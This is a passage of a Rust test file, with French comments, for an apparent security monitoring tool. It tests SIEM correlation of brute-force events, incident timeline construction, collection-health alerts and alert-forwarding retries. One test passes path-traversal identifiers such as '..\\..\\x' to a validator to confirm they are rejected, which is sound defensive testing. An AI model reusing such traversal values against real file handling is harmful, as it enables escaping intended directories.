    let i: Vec<_> = e.iter().flat_map(|e| c.analyser(e)).collect();
    assert_eq!(i[0].entite, "compte:nouveau");
}

/// Une force brute répartie sur de nombreuses adresses n'ouvre pas un incident par adresse : au-delà de 10 entités
/// distinctes d'une règle en une heure, les suivantes sont regroupées
#[test]
fn chronologie_entites_regroupees_au_dela_du_seuil() {
    use crate::siem::{Correlation, MAX_ENTITES_PAR_REGLE};
    let mut c = Correlation::default();
    let mut entites = Vec::new();
    for k in 0..(MAX_ENTITES_PAR_REGLE + 3) {
        let ip = format!("10.0.0.{k}");
        for _ in 0..5 {
            entites.extend(c.analyser(&crate::tests_detection::evenement_siem("echec-session", &[("ip", ip.as_str()), ("utilisateur", "essai")])).into_iter().map(|i| i.entite));
        }
    }
    assert_eq!(entites.len(), MAX_ENTITES_PAR_REGLE + 3);
    assert_eq!(entites[MAX_ENTITES_PAR_REGLE - 1], format!("source:10.0.0.{}", MAX_ENTITES_PAR_REGLE - 1));
    assert!(entites[MAX_ENTITES_PAR_REGLE..].iter().all(|e| e == "COR-R1:regroupees"), "{entites:?}");
    let distinctes: std::collections::HashSet<_> = entites.iter().collect();
    assert_eq!(distinctes.len(), MAX_ENTITES_PAR_REGLE + 1);
}

#[test]
fn chronologie_concerne_selon_l_entite() {
    use crate::incidents::concerne;
    let prog = incident_chrono(r"programme:c:\outils\voleur.exe");
    assert!(concerne(&prog, &evenement_chrono("processus", T0, 1, &[("processus", "VOLEUR.exe")])));
    assert!(concerne(&prog, &evenement_chrono("reponse", T0, 1, &[("destination", r"c:\outils\voleur.exe")])), "action de réponse sur le programme");
    assert!(!concerne(&prog, &evenement_chrono("processus", T0, 1, &[("processus", "autre.exe")])));
    let dest = incident_chrono("destination:203.0.113.9");
    assert!(concerne(&dest, &evenement_chrono("reponse", T0, 1, &[("destination", "203.0.113.9")])));
    assert!(concerne(&dest, &evenement_chrono("connexion", T0, 1, &[("ip", "203.0.113.9")])));
    assert!(!concerne(&dest, &evenement_chrono("connexion", T0, 1, &[("ip", "203.0.113.90")])));
    let source = incident_chrono("source:192.0.2.10");
    assert!(concerne(&source, &evenement_chrono("securite", T0, 1, &[("ip", "192.0.2.10")])));
    assert!(!concerne(&source, &evenement_chrono("securite", T0, 1, &[("ip", "192.0.2.100")])), "adresse entière, pas un préfixe");
    let compte = incident_chrono("source:compte essai");
    assert!(concerne(&compte, &evenement_chrono("securite", T0, 1, &[("utilisateur", r"POSTE\essai")])));
    assert!(!concerne(&compte, &evenement_chrono("securite", T0, 1, &[("utilisateur", r"POSTE\essai2")])));
    let regle = incident_chrono("regle:DNS-001");
    assert!(concerne(&regle, &evenement_chrono("alerte", T0, 1, &[("regle", "DNS-001")])));
    assert!(!concerne(&regle, &evenement_chrono("alerte", T0, 1, &[("regle", "DNS-002")])));
    // Santé des collectes : concerne tous les incidents (trous de collecte)
    assert!(concerne(&regle, &evenement_chrono("sante", T0, 1, &[])));
}

#[test]
fn chronologie_ordre_fenetre_et_trous() {
    use crate::incidents::{construire, transition, EtatIncident};
    let mut i = incident_chrono(r"programme:c:\outils\a.exe");
    i.alertes.push(crate::incidents::ResumeAlerte { heure_utc: "2026-10-27T07:00:00Z".into(), regle: "PER-001".into(), niveau: "Alerte".into(),
                                                    processus: "a".into(), raisons: "nouveau démarrage".into(), ..Default::default() });
    transition(&mut i, EtatIncident::PrisEnCharge, "", "", "S-1-5-32-544", "h", "2026-10-27T07:45:00Z").unwrap();
    let evts = vec![
        evenement_chrono("processus", "2026-10-27T07:30:00Z", 9, &[("processus", "a.exe")]),
        evenement_chrono("processus", "2026-10-27T07:30:00Z", 4, &[("processus", "a.exe")]),
        evenement_chrono("processus", "2026-10-27T06:00:00Z", 1, &[("processus", "a.exe")]),
        evenement_chrono("processus", "2026-10-27T09:00:00Z", 2, &[("processus", "a.exe")]),
        evenement_chrono("sante", "2026-10-27T07:10:00Z", 3, &[("message", "journal Sécurité indisponible")]),
        evenement_chrono("processus", "", 0, &[("processus", "a.exe")]),
        evenement_chrono("alerte", "2026-10-27T07:00:00Z", 5, &[("processus", "a")]),
    ];
    let c = construire(&i, &evts, 3, "2026-10-27T10:00:00Z");
    let ordre: Vec<(String, u64)> = c.elements.iter().map(|e| (e.source.clone(), e.seq)).collect();
    // Alerte jointe (07:00), trou de collecte (07:10), deux événements de 07:30 ordonnés par Seq, transition (07:45) ;
    // 06:00 hors fenêtre (avant 06:30), 09:00 dans la fenêtre (jusqu'à 08:30) : non ; alerte du SIEM écartée
    assert_eq!(ordre, [("alerte".to_string(), 0), ("sante".into(), 3), ("processus".into(), 4), ("processus".into(), 9), ("transition".into(), 0)]);
    assert_eq!((c.sans_heure_utc, c.pertes_siem, c.tronquee), (1, 3, false));
    assert_eq!((c.depuis_utc.as_str(), c.jusqua_utc.as_str()), ("2026-10-27T06:30:00Z", "2026-10-27T08:30:00Z"));
}

#[test]
fn chronologie_bornee_tronquee() {
    use crate::incidents::{construire, MAX_ELEMENTS};
    let i = incident_chrono("regle:DNS-001");
    let evts: Vec<_> = (0..5000u64).map(|k| evenement_chrono("securite", "2026-10-27T07:30:00Z", k + 1, &[("regle", "DNS-001")])).collect();
    let c = construire(&i, &evts, 0, "x");
    assert!(c.tronquee);
    assert_eq!(c.elements.len(), MAX_ELEMENTS);
    assert_eq!((c.elements[0].seq, c.elements[MAX_ELEMENTS - 1].seq), (1, 5000), "premiers et derniers gardés");
    let long = evenement_chrono("securite", "2026-10-27T07:30:00Z", 1, &[("regle", "DNS-001"), ("message", &"m".repeat(5000))]);
    assert!(construire(&i, &[long], 0, "x").elements[0].texte.chars().count() <= 400, "texte borné");
}

/// S96-02 : un identifiant relu qui sortirait du dossier des chronologies écarte l'incident. Lecture du SIEM par entité :
/// le texte cherché est ce que `concerne` compare, sous sa forme JSON
#[test]
fn chronologie_identifiant_et_cle_de_recherche() {
    use crate::incidents::{cle_recherche, lire_suivi_texte};
    let (s, ecartes) = lire_suivi_texte(r#"[{"Id":"a1-b2"},{"Id":"..\\..\\x"},{"Id":"a/b"},{"Id":""}]"#).unwrap();
    assert_eq!((s.len(), s[0].id.as_str(), ecartes), (1, "a1-b2", 3));
    assert_eq!(cle_recherche(r"programme:c:\outils\Voleur.exe"), "voleur");
    assert_eq!(cle_recherche("source:192.0.2.10"), "192.0.2.10");
    assert_eq!(cle_recherche("source:compte Essai"), "essai");
    assert_eq!(cle_recherche("compte:essai"), "essai");
    assert_eq!(cle_recherche(r"destination:c:\données\a"), r"c:\\données\\a", "forme JSON");
    assert_eq!(cle_recherche("regle:DNS-001"), "dns-001");
    assert_eq!(cle_recherche("COR-R1:regroupees"), "");
    // Le texte cherché se trouve bien dans la ligne écrite par le SIEM
    let e = evenement_chrono("securite", T0, 1, &[("destination", r"C:\Données\a")]);
    assert!(serde_json::to_string(&e).unwrap().to_lowercase().contains(&cle_recherche(r"destination:c:\données\a")));
}

/// D3 : un événement qui porte un chemin complet n'est rattaché que par ce chemin ; par le nom seul, il est signalé
#[test]
fn chronologie_lien_par_le_nom_signale() {
    use crate::incidents::{construire, lien, Lien};
    let i = incident_chrono(r"programme:c:\outils\svchost.exe");
    assert_eq!(lien(&i, &evenement_chrono("processus", T0, 1, &[("processus", r"C:\Windows\System32\svchost.exe")])), None, "autre chemin");
    assert_eq!(lien(&i, &evenement_chrono("processus", T0, 1, &[("processus", r"C:\Outils\svchost.exe")])), Some(Lien::Exact));
    assert_eq!(lien(&i, &evenement_chrono("processus", T0, 1, &[("processus", "svchost.exe")])), Some(Lien::ParNom));
    let c = construire(&i, &[evenement_chrono("processus", "2026-10-27T07:30:00Z", 1, &[("processus", "svchost.exe")])], 0, "x");
    assert!(c.elements[0].par_nom);
    assert!(serde_json::to_string(&c).unwrap().contains("\"ParNom\":true"));
}

/// R3-D1 : une chronologie n'est commencée qu'avec ses 5 s pleines dans le tour
#[test]
fn chronologie_commencee_avec_son_budget_plein() {
    use crate::incidents::peut_commencer;
    use std::time::Duration;
    assert!(peut_commencer(Duration::from_secs(10)));
    assert!(peut_commencer(Duration::from_secs(5)));
    assert!(!peut_commencer(Duration::from_millis(4999)));
    assert!(!peut_commencer(Duration::ZERO));
}

#[test]
fn chronologie_a_recalculer_au_changement() {
    use crate::incidents::{a_recalculer, repere};
    let mut i = incident_chrono("regle:DNS-001");
    let mut calcules = std::collections::HashMap::new();
    assert_eq!(a_recalculer(std::slice::from_ref(&i), &calcules, 50).len(), 1, "jamais calculée");
    calcules.insert(i.id.clone(), repere(&i));
    assert!(a_recalculer(std::slice::from_ref(&i), &calcules, 50).is_empty(), "inchangée");
    i.nombre_alertes += 1;
    assert_eq!(a_recalculer(std::slice::from_ref(&i), &calcules, 50).len(), 1, "nouvelle alerte");
    let many: Vec<_> = (0..80).map(|k| crate::incidents::IncidentSuivi { id: format!("i{k}"), ..Default::default() }).collect();
    let pris = a_recalculer(&many, &std::collections::HashMap::new(), 50);
    assert_eq!((pris.len(), pris[0].id.as_str()), (50, "i79"), "50 au plus, les plus récents d'abord");
}

/// Second audit, B-5-01 : au-delà de 20 transitions (plafond de l'historique gardé), le repère changeait plus et la
/// chronologie n'était plus recalculée. Le repère suit le nombre total de transitions ; la liste gardée reste bornée
#[test]
fn chronologie_recalculee_au_dela_de_20_transitions() {
    use crate::incidents::{a_recalculer, borner_incident, repere, transition, EtatIncident};
    let mut i = incident_chrono("regle:DNS-001");
    let mut calcules = std::collections::HashMap::new();
    for k in 1..=25u32 {
        calcules.insert(i.id.clone(), repere(&i));
        let (vers, motif) = if i.etat == EtatIncident::Clos { (EtatIncident::Ouvert, "") } else { (EtatIncident::Clos, "Resolu") };
        transition(&mut i, vers, motif, &format!("t{k}"), "S-1-5-32-544", "h", "2026-10-27T07:45:00Z").unwrap();
        assert_eq!(a_recalculer(std::slice::from_ref(&i), &calcules, 50).len(), 1, "transition {k} : chronologie à recalculer");
        assert!(i.transitions.len() <= 20, "historique gardé borné");
    }
    assert_eq!((i.transitions.len(), i.nombre_transitions), (20, 25));
    assert_eq!(i.transitions[19].note, "t25", "les dernières gardées");
    // Relu (fichier) : le compteur est gardé, le repère est le même
    let mut relu = i.clone();
    borner_incident(&mut relu);
    assert_eq!(repere(&relu), repere(&i));
    // Suivi écrit avant la correction (compteur absent, 20 transitions gardées) : même repère qu'avant, pas de
    // recalcul inutile au démarrage ; la transition suivante le change
    let mut ancien = i.clone();
    ancien.nombre_transitions = 0;
    assert_eq!(repere(&ancien), format!("{}|20|{}", ancien.derniere_activite_utc, ancien.nombre_alertes));
    let avant = repere(&ancien);
    let vers = if ancien.etat == EtatIncident::Clos { EtatIncident::Ouvert } else { EtatIncident::PrisEnCharge };
    transition(&mut ancien, vers, "", "", "S-1-5-32-544", "h", "2026-10-27T07:46:00Z").unwrap();
    assert_ne!(repere(&ancien), avant);
    assert_eq!(ancien.nombre_transitions, 21);
}

// ------------------------------------------------------------ phase 4, PR 4.4a : santé des collectes

fn sante_etats(indispo: &[crate::collectes::Collecte], desactivees: &[crate::collectes::Collecte]) -> Vec<(crate::collectes::Collecte, crate::collectes::EtatPublie, bool)> {
    use crate::collectes::{EtatPublie, TOUTES};
    TOUTES.iter().map(|c| (*c, if indispo.contains(c) { EtatPublie::Indisponible("lecture impossible".into()) }
        else if desactivees.contains(c) { EtatPublie::Desactivee("par choix".into()) } else { EtatPublie::Active }, false)).collect()
}

/// Comme `sante_etats`, ces collectes muettes seulement (notées actives, sans lecture depuis plus de trois périodes)
fn sante_muettes(muettes: &[crate::collectes::Collecte]) -> Vec<(crate::collectes::Collecte, crate::collectes::EtatPublie, bool)> {
    sante_etats(muettes, &[]).into_iter().map(|(c, e, _)| (c, e, muettes.contains(&c))).collect()
}

/// Relecture de #98, D1 : après une veille, les listes de menaces (relues toutes les heures) restent muettes jusqu'à
/// leur prochain tour ; ce silence seul ne lève pas SAN-001. Notées indisponibles par leur source : SAN-001. Une
/// collecte relue souvent (journal Sécurité) compte son silence
#[test]
fn sante_veille_silence_des_listes_sans_constat() {
    use crate::collectes::Collecte::{JournalSecurite, ListesMenaces};
    let mut s = crate::sante::Sante::default();
    s.observer(&sante_muettes(&[ListesMenaces]), 0, 0);
    assert!(s.observer(&sante_muettes(&[ListesMenaces]), 0, 3 * 3600).1.is_empty(), "silence seul après une veille");
    let (c, _) = s.observer(&sante_muettes(&[ListesMenaces]), 0, 3 * 3600 + 30);
    assert!(c.is_empty(), "historique : rien de nouveau");
    let mut s = crate::sante::Sante::default();
    s.observer(&sante_etats(&[ListesMenaces], &[]), 0, 0);
    assert_eq!(s.observer(&sante_etats(&[ListesMenaces], &[]), 0, 1800).1.len(), 1, "notée indisponible par la source");
    let mut s = crate::sante::Sante::default();
    s.observer(&sante_muettes(&[JournalSecurite]), 0, 0);
    assert_eq!(s.observer(&sante_muettes(&[JournalSecurite]), 0, 1800).1.len(), 1, "journal muet 30 min");
    assert!(crate::sante::silence_compte(crate::collectes::Collecte::EtatDefender));
    assert!(!crate::sante::silence_compte(ListesMenaces));
}

/// Audit de #98, S98-01 : rétablie, une collecte peut de nouveau être signalée sans attendre 24 h ; de même pour
/// Defender aveugle
#[test]
fn sante_rappel_remis_a_zero_au_retablissement() {
    use crate::collectes::Collecte::{Connexions, EtatDefender, JournalDefender};
    let mut s = crate::sante::Sante::default();
    s.observer(&sante_etats(&[Connexions], &[]), 0, 0);
    assert_eq!(s.observer(&sante_etats(&[Connexions], &[]), 0, 1800).1.len(), 1, "panne d'essai");
    assert_eq!(s.observer(&sante_etats(&[], &[]), 0, 2000).1.len(), 1, "SAN-002");
    s.observer(&sante_etats(&[Connexions], &[]), 0, 3000);
    let (_, a) = s.observer(&sante_etats(&[Connexions], &[]), 0, 4800);
    assert_eq!(sante_regles(&a), [("SAN-001".to_string(), "Alerte".to_string(), "Connexions".to_string())], "vraie panne signalée");
    let mut s = crate::sante::Sante::default();
    s.observer(&sante_etats(&[JournalDefender, EtatDefender], &[]), 0, 0);
    assert_eq!(s.observer(&sante_etats(&[JournalDefender, EtatDefender], &[]), 0, 1800).1.len(), 1);
    s.observer(&sante_etats(&[], &[]), 0, 2000);
    s.observer(&sante_etats(&[JournalDefender, EtatDefender], &[]), 0, 3000);
    let (_, a) = s.observer(&sante_etats(&[JournalDefender, EtatDefender], &[]), 0, 4800);
    assert_eq!(sante_regles(&a).into_iter().map(|x| x.0).collect::<Vec<_>>(), ["SAN-003"], "Defender de nouveau aveugle");
}

fn sante_regles(a: &[crate::commun::Alerte]) -> Vec<(String, String, String)> {
    a.iter().map(|x| (x.regle.clone(), x.niveau.clone(), x.destination.clone())).collect()
}

/// Audit du 2026-11-23, A-6-3 : SAN-013 à la première perte d'événements du SIEM, au premier plafond du jour atteint et à
/// la première purge par la taille ; une hausse d'un compteur déjà signalé : une fois par 24 h au plus
#[test]
fn sante_san013_historique_incomplet() {
    use crate::siem::CompteursSiem;
    let mut s = crate::sante::Sante::default();
    let t0 = 1_000_000;
    assert!(s.observer_siem(CompteursSiem::default(), t0).is_none(), "rien de perdu : rien");
    let a = s.observer_siem(CompteursSiem { pertes: 1, ..Default::default() }, t0).expect("première perte");
    assert_eq!(sante_regles(&[a.clone()]), [("SAN-013".to_string(), "Alerte".to_string(), "mini-SIEM".to_string())]);
    assert!(a.raisons.contains("1 événement(s) perdu(s)"), "{}", a.raisons);
    assert!(s.observer_siem(CompteursSiem { pertes: 50, ..Default::default() }, t0 + 60).is_none(), "hausse : pas avant 24 h");
    let b = s.observer_siem(CompteursSiem { pertes: 50, plafonnes: 3, ..Default::default() }, t0 + 120).expect("premier plafond, même dans les 24 h");
    assert!(b.raisons.contains("plafond du jour") && b.raisons.contains("3 événement(s)"), "{}", b.raisons);
    let c = s.observer_siem(CompteursSiem { pertes: 50, plafonnes: 3, purges_taille: 1 }, t0 + 180).expect("première purge par la taille");
    assert!(c.raisons.contains("supprimé(s) pour la taille"), "{}", c.raisons);
    assert!(s.observer_siem(CompteursSiem { pertes: 50, plafonnes: 3, purges_taille: 1 }, t0 + 200_000).is_none(), "rien de nouveau");
    assert!(s.observer_siem(CompteursSiem { pertes: 51, plafonnes: 3, purges_taille: 1 }, t0 + 200_000).is_some(), "hausse après 24 h");
}

#[test]
fn sante_collecte_muette_30_min() {
    use crate::collectes::Collecte::JournalSecurite;
    let mut s = crate::sante::Sante::default();
    let t0 = 1_000_000;
    assert!(s.observer(&sante_etats(&[], &[]), 0, t0).1.is_empty());
    assert!(s.observer(&sante_etats(&[JournalSecurite], &[]), 0, t0 + 60).1.is_empty());
    assert!(s.observer(&sante_etats(&[JournalSecurite], &[]), 0, t0 + 60 + 1799).1.is_empty(), "pas avant 30 min");
    let (_, a) = s.observer(&sante_etats(&[JournalSecurite], &[]), 0, t0 + 60 + 1800);
    assert_eq!(sante_regles(&a), [("SAN-001".to_string(), "Alerte".to_string(), "JournalSecurite".to_string())]);
    assert!(a[0].raisons.contains("depuis 30 min") && a[0].raisons.contains("lecture impossible"), "{}", a[0].raisons);
    assert!(s.observer(&sante_etats(&[JournalSecurite], &[]), 0, t0 + 7200).1.is_empty(), "une fois par 24 h");
}

#[test]
fn sante_collecte_revenue_avant_30_min() {
    use crate::collectes::Collecte::Connexions;
    let mut s = crate::sante::Sante::default();
    s.observer(&sante_etats(&[], &[]), 0, 0);
    s.observer(&sante_etats(&[Connexions], &[]), 0, 10);
    s.observer(&sante_etats(&[], &[]), 0, 1000);
    let (_, a) = s.observer(&sante_etats(&[Connexions], &[]), 0, 1100);
    assert!(a.is_empty());
    assert!(s.observer(&sante_etats(&[Connexions], &[]), 0, 1100 + 1799).1.is_empty(), "la panne recommence à zéro");
    // Une collecte non critique ne lève jamais SAN-001
    let mut s = crate::sante::Sante::default();
    s.observer(&sante_etats(&[crate::collectes::Collecte::Extensions], &[]), 0, 0);
    assert!(s.observer(&sante_etats(&[crate::collectes::Collecte::Extensions], &[]), 0, 99_999).1.is_empty());
}

#[test]
fn sante_collecte_retablie() {
    use crate::collectes::Collecte::Processus;
    let mut s = crate::sante::Sante::default();
    s.observer(&sante_etats(&[Processus], &[]), 0, 0);
    assert_eq!(s.observer(&sante_etats(&[Processus], &[]), 0, 1800).1.len(), 1);
    let (_, a) = s.observer(&sante_etats(&[], &[]), 0, 2400);
    assert_eq!(sante_regles(&a), [("SAN-002".to_string(), "Info".to_string(), "Processus".to_string())]);
    assert!(a[0].raisons.contains("après 40 min"), "{}", a[0].raisons);
    assert!(s.observer(&sante_etats(&[], &[]), 0, 2500).1.is_empty(), "une seule fois");
}

#[test]
fn sante_desactivee_sans_alerte() {
    use crate::collectes::Collecte::{JournalSecurite, ListesMenaces};
    let mut s = crate::sante::Sante::default();
    for t in [0, 1800, 90_000] {
        assert!(s.observer(&sante_etats(&[], &[JournalSecurite, ListesMenaces]), 0, t).1.is_empty());
    }
}

#[test]
fn sante_inconnue_compte_indisponible() {
    use crate::collectes::{Collecte::ListesMenaces, EtatPublie};
    let mut s = crate::sante::Sante::default();
    let mut e = sante_etats(&[], &[]);
    e.iter_mut().find(|(c, _, _)| *c == ListesMenaces).unwrap().1 = EtatPublie::Inconnue;
    s.observer(&e, 0, 0);
    let (_, a) = s.observer(&e, 0, 1800);
    assert_eq!(a.len(), 1);
    assert!(a[0].raisons.contains("jamais lue"), "{}", a[0].raisons);
}

#[test]
fn sante_defender_aveugle_critique() {
    use crate::collectes::Collecte::{EtatDefender, JournalDefender};
    let mut s = crate::sante::Sante::default();
    s.observer(&sante_etats(&[JournalDefender], &[]), 0, 0);
    s.observer(&sante_etats(&[JournalDefender, EtatDefender], &[]), 0, 600);
    // Journal muet depuis 0, état depuis 600 : SAN-001 du journal à 1800, puis SAN-003 à 2400 (les deux depuis 30 min)
    assert_eq!(sante_regles(&s.observer(&sante_etats(&[JournalDefender, EtatDefender], &[]), 0, 1800).1),
               [("SAN-001".to_string(), "Alerte".to_string(), "JournalDefender".to_string())]);
    let (_, a) = s.observer(&sante_etats(&[JournalDefender, EtatDefender], &[]), 0, 2400);
    assert_eq!(sante_regles(&a), [("SAN-003".to_string(), "Critique".to_string(), "Microsoft Defender".to_string())], "SAN-003 seul, sans SAN-001 de l'état");
    assert!(s.observer(&sante_etats(&[JournalDefender, EtatDefender], &[]), 0, 5000).1.is_empty());
    // Retour : SAN-002 pour les deux
    let (_, a) = s.observer(&sante_etats(&[], &[]), 0, 6000);
    let r: Vec<_> = sante_regles(&a).into_iter().map(|x| (x.0, x.2)).collect();
    assert_eq!(r, [("SAN-002".to_string(), "JournalDefender".to_string()), ("SAN-002".into(), "EtatDefender".into())]);
}

#[test]
fn sante_defender_un_seul_collecteur() {
    use crate::collectes::Collecte::EtatDefender;
    let mut s = crate::sante::Sante::default();
    s.observer(&sante_etats(&[EtatDefender], &[]), 0, 0);
    let (_, a) = s.observer(&sante_etats(&[EtatDefender], &[]), 0, 1800);
    assert_eq!(sante_regles(&a), [("SAN-001".to_string(), "Alerte".to_string(), "EtatDefender".to_string())], "pas de SAN-003");
}

#[test]
fn sante_rappel_apres_24_h() {
    use crate::collectes::Collecte::Connexions;
    let mut s = crate::sante::Sante::default();
    s.observer(&sante_etats(&[Connexions], &[]), 0, 0);
    assert_eq!(s.observer(&sante_etats(&[Connexions], &[]), 0, 1800).1.len(), 1);
    assert!(s.observer(&sante_etats(&[Connexions], &[]), 0, 1800 + 86_399).1.is_empty());
    assert_eq!(s.observer(&sante_etats(&[Connexions], &[]), 0, 1800 + 86_400).1.len(), 1, "rappel après 24 h");
}

#[test]
fn sante_historique_au_changement_et_instable() {
    use crate::collectes::{Collecte::{Extensions, JournalDns}, EtatPublie, TOUTES};
    let mut s = crate::sante::Sante::default();
    // Démarrage : Inconnue puis Active, tu
    let inconnues: Vec<_> = TOUTES.iter().map(|c| (*c, EtatPublie::Inconnue, false)).collect();
    assert!(s.observer(&inconnues, 0, 0).0.is_empty());
    assert!(s.observer(&sante_etats(&[], &[]), 0, 30).0.is_empty(), "Inconnue → Active tu");
    assert!(s.observer(&sante_etats(&[], &[]), 0, 60).0.is_empty(), "pas de changement, rien");
    let (c, _) = s.observer(&sante_etats(&[JournalDns], &[]), 0, 90);
    assert_eq!(c, [crate::sante::Changement { collecte: "JournalDns", avant: "Active".into(), apres: "Indisponible".into(), raison: "lecture impossible".into(), instable: false }]);
    let e = crate::sante::evenement(&c[0]);
    assert_eq!((e.source.as_str(), e.type_.as_str(), e.niveau.as_str(), e.destination.as_str()), ("sante", "collecte", "Alerte", "JournalDns"));
    // Instable : 6 changements dans l'heure écrits, puis une ligne par heure
    let mut s = crate::sante::Sante::default();
    s.observer(&sante_etats(&[], &[]), 0, 0);
    let mut lignes = Vec::new();
    for k in 1..=20i64 {
        let (c, _) = s.observer(&sante_etats(if k % 2 == 1 { &[Extensions][..] } else { &[][..] }, &[]), 0, k * 60);
        lignes.extend(c.into_iter().map(|x| x.instable));
    }
    assert_eq!(lignes, [false, false, false, false, false, false, true], "6 lignes, puis une seule « instable » dans l'heure");
    let (c, _) = s.observer(&sante_etats(&[Extensions], &[]), 0, 7 * 60 + 3600);
    assert_eq!(c.len(), 1, "une ligne l'heure suivante");
    // Une heure sans changement : la collecte n'est plus « instable »
    let (c, _) = s.observer(&sante_etats(&[], &[]), 0, 7 * 60 + 2 * 3600 + 1);
    assert_eq!(c.iter().map(|x| x.instable).collect::<Vec<_>>(), [false], "redevenue stable");
}

#[test]
fn incidents_plafond_non_clos() {
    let mut s = crate::sante::Sante::default();
    let e = sante_etats(&[], &[]);
    assert!(s.observer(&e, 0, 0).1.is_empty());
    let (_, a) = s.observer(&e, 3, 30);
    assert_eq!(sante_regles(&a), [("SAN-012".to_string(), "Critique".to_string(), "suivi des incidents".to_string())]);
    assert!(a[0].raisons.starts_with("3 alerte(s)"));
    assert!(s.observer(&e, 50, 3600).1.is_empty(), "une fois par 24 h");
    assert_eq!(s.observer(&e, 50, 30 + 86_400).1.len(), 1);
    assert!(s.observer(&e, 50, 30 + 2 * 86_400).1.is_empty(), "rien de nouveau depuis le dernier constat");
}

#[test]
fn sante_jamais_adoucie_par_l_apprentissage() {
    let a = crate::commun::Alerte { regle: "SAN-001".into(), niveau: "Alerte".into(), destination: "Connexions".into(), ..Default::default() };
    assert!(crate::apprentissage::signal_fort(&a));
    let b = crate::commun::Alerte { regle: "RES-003".into(), niveau: "Alerte".into(), ..Default::default() };
    assert!(!crate::apprentissage::signal_fort(&b));
}

// ------------------------------------------------------------ phase 4, PR 4.4b : santé de la remontée

fn alerte_remontee(id: &str, niveau: &str, regle: &str) -> crate::commun::Alerte {
    crate::commun::Alerte { id: id.into(), niveau: niveau.into(), regle: regle.into(), ..Default::default() }
}

#[test]
fn remontee_echec_retentee_sans_doublon() {
    use crate::notifications::{a_retenter, FileReprise};
    let mut f = FileReprise::default();
    let lot = [alerte_remontee("a", "Critique", "INT-001"), alerte_remontee("b", "Alerte", "RES-003"), alerte_remontee("c", "Alerte", "SAN-001"),
               alerte_remontee("d", "Alerte", "SAN-004")];
    f.ajouter(&lot, 0);
    f.ajouter(&lot, 10);
    let ids: Vec<_> = f.entrees.iter().map(|r| r.alerte.id.as_str()).collect();
    assert_eq!(ids, ["a", "c"], "critique et SAN-* (sauf SAN-004), une seule fois chacune");
    assert!(!a_retenter(&alerte_remontee("x", "Info", "SAN-004")));
    assert!(f.dues(59).is_empty());
    assert_eq!(f.dues(60).len(), 2);
    f.resultat(&["a".into()], true, 60);
    assert_eq!(f.entrees.len(), 1, "remise : sortie de la file");
}

#[test]
fn remontee_calendrier_1_5_15_60() {
    use crate::notifications::FileReprise;
    let mut f = FileReprise::default();
    f.ajouter(&[alerte_remontee("a", "Critique", "")], 0);
    let mut essais = Vec::new();
    let mut t = 0;
    while essais.len() < 6 {
        t += 1;
        if !f.dues(t).is_empty() {
            essais.push(t);
            f.resultat(&["a".into()], false, t);
        }
    }
    assert_eq!(essais, [60, 360, 1260, 4860, 8460, 12060], "+1, +5, +15, +60 min, puis toutes les heures");
}

#[test]
fn remontee_file_bornee_100_24h() {
    use crate::notifications::{FileReprise, REPRISE_MAX};
    let mut f = FileReprise::default();
    let lot: Vec<_> = (0..REPRISE_MAX + 5).map(|k| alerte_remontee(&format!("a{k}"), "Critique", "")).collect();
    f.ajouter(&lot, 0);
    assert_eq!((f.entrees.len(), f.abandonnees), (REPRISE_MAX, 5));
    let ids: Vec<_> = f.entrees.iter().map(|r| r.alerte.id.clone()).collect();
    assert_eq!((ids[0].as_str(), ids[49].as_str(), ids[50].as_str(), ids[99].as_str()), ("a0", "a49", "a55", "a104"),
               "les 50 premières restent ; la seconde moitié tourne (S99-01)");
    assert_eq!(f.dues(86_399).len(), REPRISE_MAX);
    assert!(f.dues(86_400).is_empty(), "24 h au plus");
    assert_eq!((f.entrees.len(), f.abandonnees), (0, 5 + REPRISE_MAX as u64));
}

#[test]
fn remontee_remis_si_un_canal() {
    use crate::notifications::remis;
    assert!(remis(1, 0));
    assert!(remis(3, 2), "remis sur un canal : pas retenté (doublon sur ce canal)");
    assert!(!remis(2, 2));
    assert!(!remis(0, 0), "aucun canal tenté : non remis");
}

#[test]
fn sante_remontee_echec_1h() {
    let mut s = crate::sante::Sante::default();
    assert!(s.observer_remontee(Some(0), 3599).is_none());
    let a = s.observer_remontee(Some(0), 3600).unwrap();
    assert_eq!((a.regle.as_str(), a.niveau.as_str()), ("SAN-004", "Alerte"));
    assert!(a.raisons.contains("depuis 60 min"), "{}", a.raisons);
    assert!(s.observer_remontee(Some(0), 7200).is_none(), "une fois par panne");
    assert!(s.observer_remontee(None, 7300).is_none(), "rétablie");
    assert!(s.observer_remontee(Some(8000), 11_600).is_some(), "nouvelle panne signalée");
}

#[test]
fn sante_remontee_non_configuree() {
    let mut s = crate::sante::Sante::default();
    for t in [0, 3600, 90_000] {
        assert!(s.observer_remontee(None, t).is_none());
    }
    assert_eq!(crate::notifications::echec_depuis(), None, "aucun échec sans remontée");
}

#[test]
fn battement_quotidien_apres_9h() {
    use crate::notifications::battement_du;
    assert!(!battement_du("", "2026-10-27 08:59:59"));
    assert!(battement_du("", "2026-10-27 09:00:00"));
    assert!(!battement_du("2026-10-27", "2026-10-27 18:00:00"), "un par jour");
    assert!(battement_du("2026-10-27", "2026-10-28 09:30:00"));
    assert!(!battement_du("", "illisible"));
    // Format de commun::maintenant
    let m = crate::commun::maintenant();
    assert!(m.get(..10).is_some() && m.get(11..13).is_some_and(|h| h.parse::<u32>().is_ok()), "{m}");
}

#[test]
fn battement_compteurs_seulement() {
    use crate::collectes::{Collecte, EtatPublie};
    let mut e = sante_etats(&[Collecte::JournalSecurite, Collecte::Extensions], &[Collecte::Sysmon]);
    e.iter_mut().find(|(c, _, _)| *c == Collecte::ListesMenaces).unwrap().1 = EtatPublie::Inconnue;
    let c = crate::sante::compteurs(&e, 4);
    assert_eq!((c.incidents_non_clos, c.collectes_indisponibles, c.critiques_indisponibles.clone()), (4, 3, vec!["JournalSecurite", "ListesMenaces"]));
    assert_eq!(c.collectes_actives, crate::collectes::TOUTES.len() - 4);
    let t = crate::notifications::texte_battement(&c, 2);
    assert_eq!(t, format!("deR4Tizer actif : 4 incident(s) non clos ; collectes : {} active(s), 3 indisponible(s) (critiques : JournalSecurite, ListesMenaces) ; 2 alerte(s) en attente de remontée.", c.collectes_actives));
}

// ------------------------------------------------------------ phase 4, PR 4.5a : santé de l'interface

fn interfaces_regles(a: &[crate::commun::Alerte]) -> Vec<(String, String)> {
    a.iter().map(|x| (x.regle.clone(), x.destination.clone())).collect()
}

#[test]
fn sante_interface_absente_15_min() {
    let mut i = crate::sante::Interfaces::default();
    assert!(i.observer(&[2], &[2], 0).1.is_empty());
    let (e, _) = i.observer(&[2], &[], 60);
